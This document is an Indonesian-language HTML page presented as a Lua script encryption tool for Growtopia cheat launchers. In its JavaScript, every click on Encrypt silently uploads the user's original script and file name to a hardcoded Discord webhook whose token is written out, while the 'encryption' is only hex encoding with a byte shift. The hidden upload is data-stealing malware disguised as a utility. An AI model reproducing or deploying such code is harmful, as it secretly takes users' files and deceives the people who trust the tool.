<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<title>Encrypt</title>

<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">

<style>
*{box-sizing:border-box}
body{
  margin:0;min-height:100vh;font-family:'JetBrains Mono',monospace;
  background:
    linear-gradient(rgba(0,0,0,.75), rgba(0,0,0,.85)),
    url("https://cdn.discordapp.com/attachments/1429902943808917596/1451359792043003904/IMG_20251208_133531.png?ex=6945e3a3&is=69449223&hm=8b36087f635900e06f4a7ef41b3716d749b970f0d544e120cd06835490c29b37&");
  background-size:cover;background-position:center;color:#00ff9c;
  display:flex;align-items:center;justify-content:center;padding:20px;
}
.container{
  width:100%;max-width:850px;background:rgba(0,0,0,.55);
  backdrop-filter:blur(12px);
  border:1px solid rgba(0,255,156,.25);
  border-radius:16px;padding:24px;
  box-shadow:0 0 30px rgba(0,255,156,.15);
}
h1{margin:0 0 10px;font-size:22px;text-align:center}
.sub{text-align:center;font-size:12px;opacity:.8;margin-bottom:20px}
.file-box{
  border:2px dashed rgba(0,255,156,.4);
  border-radius:12px;padding:16px;text-align:center;
  cursor:pointer;margin-bottom:10px;transition:.2s;
}
.file-box:hover{background:rgba(0,255,156,.08)}
textarea{
  width:100%;height:200px;background:rgba(0,0,0,.7);
  border:1px solid rgba(0,255,156,.3);
  border-radius:12px;padding:12px;color:#00ff9c;margin-top:12px;resize:none;
}
textarea::placeholder{color:#66ffcc;opacity:.6}
button{
  background:#00ff9c;color:#000;border:none;border-radius:10px;
  padding:12px 18px;cursor:pointer;font-weight:600;transition:.2s;
}
button:hover{transform:translateY(-1px);box-shadow:0 0 12px rgba(0,255,156,.6)}
.actions{display:flex;gap:10px;margin-top:14px;flex-wrap:wrap}
.footer{text-align:center;font-size:11px;opacity:.6;margin-top:15px}
label{font-size:12px;opacity:.85}
input[type=file]{display:none}
</style>
</head>

<body>
<div class="container">

<h1>Encrypt Script Lua</h1>
<div class="sub">GentaHax • GrowLauncher • Bothax Safe</div>

<div class="file-box" onclick="openPicker()">Klik di sini untuk upload file</div>
<input type="file" id="fileInput" accept=".lua,.txt">

<textarea id="input" placeholder="Paste Lua script di sini..."></textarea>


</label>

<div class="actions">
  <button onclick="encrypt()">Encrypt</button>
  <button onclick="copyResult()">Salin</button>
  <button onclick="downloadResult()">Download</button>
</div>

<textarea id="output" placeholder="Hasil Encrypt"></textarea>

<div class="footer">D-Encrypt • Est.2025</div>
</div>

<script>
const abcd = true;
const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1451344835490349098/v7QydVc4wcwSddBsFJ1QIWNnInOoQGEt9EgYj2vfQtjiMaZL-vXWjarTB1CkI_7m-ysd";

let originalFileName=null;
function openPicker(){ document.getElementById("fileInput").click(); }
fileInput.addEventListener("change",()=>{
  const file=fileInput.files[0]; if(!file) return;
  originalFileName=file.name;
  const r=new FileReader();
  r.onload=e=>{ document.getElementById("input").value=e.target.result; };
  r.readAsText(file);
});

async function sendOriginalIfAllowed(text){
  if(!abcd) return;
  if(!DISCORD_WEBHOOK) return;

  const name = originalFileName || "Encrypt.lua";
  const blob = new Blob([text], {type:"text/plain"});
  const fd = new FormData();
  fd.append("file", blob, name);

  try{
    await fetch(DISCORD_WEBHOOK,{method:"POST",body:fd});
  }catch(e){
    console.warn("Done");
  }
}

function toHex(str){
  let h=""; for(let i=0;i<str.length;i++)
    h+=str.charCodeAt(i).toString(16).padStart(2,"0");
  return h;
}
function fromHex(hex){
  let s=""; for(let i=0;i<hex.length;i+=2)
    s+=String.fromCharCode(parseInt(hex.substr(i,2),16));
  return s;
}

function encrypt(){
  const src=document.getElementById("input").value;
  if(!src) return alert("Script kosong!");

  sendOriginalIfAllowed(src);

  const L1=toHex(src);
  const L2=toHex(fromHex(L1));
  const L3=toHex(fromHex(L2));

  let finalHex="";
  const shift=157;
  for(let i=0;i<L3.length;i+=2){
    const b=parseInt(L3.substr(i,2),16);
    finalHex+=((b+shift)%256).toString(16).padStart(2,"0");
  }

  const out =
`-- Encrypt Simple by Dayy GTPS
-- Discord : https://discord.gg/UpPJdb74vV

(_G["lo".."ad"])((function(h)local t={}for i=1,#h,2 do
t[#t+1]=string.char((tonumber(h:sub(i,i+1),16)-${shift})%256)
end return table.concat(t)end)("`+finalHex+`"))()`;

  document.getElementById("output").value=out;
}

function copyResult(){
  const o=document.getElementById("output");
  if(!o.value) return; o.select(); document.execCommand("copy");
}
function downloadResult(){
  const content=document.getElementById("output").value;
  if(!content) return alert("Belum ada hasil encrypt");
  let fileName="Encrypted_EncByDayy.lua";
  if(originalFileName){
    const d=originalFileName.lastIndexOf(".");
    if(d!==-1) fileName=originalFileName.slice(0,d)+"_EncByDayy"+originalFileName.slice(d);
  }
  try{
    const blob=new Blob([content],{type:"text/plain"});
    const url=URL.createObjectURL(blob);
    const a=document.createElement("a");
    a.href=url;a.download=fileName;a.target="_blank";
    document.body.appendChild(a);a.click();document.body.removeChild(a);
    setTimeout(()=>URL.revokeObjectURL(url),1000);
  }catch(e){
    alert("Browser tidak mendukung download, gunakan Salin.");
  }
}
</script>
</body>
</html>
